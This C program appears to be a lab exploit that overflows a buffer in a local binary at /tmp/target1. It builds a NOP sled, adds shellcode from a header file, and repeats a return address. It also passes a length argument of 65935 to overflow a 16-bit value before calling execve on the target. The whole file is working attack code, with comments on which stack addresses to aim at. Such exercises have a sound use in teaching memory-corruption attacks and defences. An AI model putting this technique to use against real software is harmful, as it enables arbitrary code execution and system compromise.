#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

int main(void)
{
  char *args[4]; 
  char *env[1];

  char str[408];
  memset(str, 0, 408);

  // `perl -e 'print "\x90"x203';`
  for (int i = 0; i < 203; ++i)
  {
  	strcat(str, "\x90");
  }

  // `cat sc`
  strcat(str, shellcode);
  // `perl -e 'print"\xf8\xf2\xff\xbf"x38' the return address
  
  for (int i = 0; i < 38; ++i)
  {
    // Anything from 0xbffffb30 to 0xbffffbf0 should work
    // the return address should point to the \x90
    // below the shellcode
    // above the EBP
    strcat(str, "\x80\xfb\xff\xbf");
  }
  args[0] = TARGET;
  args[1] = str;
  // 16 bits: maximum representable value 216 − 1 = 65,535
  // 65535 + 399 + 1 = 65935  
  args[2] = "65935";
  args[3] = NULL;

  env[0] = NULL;
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}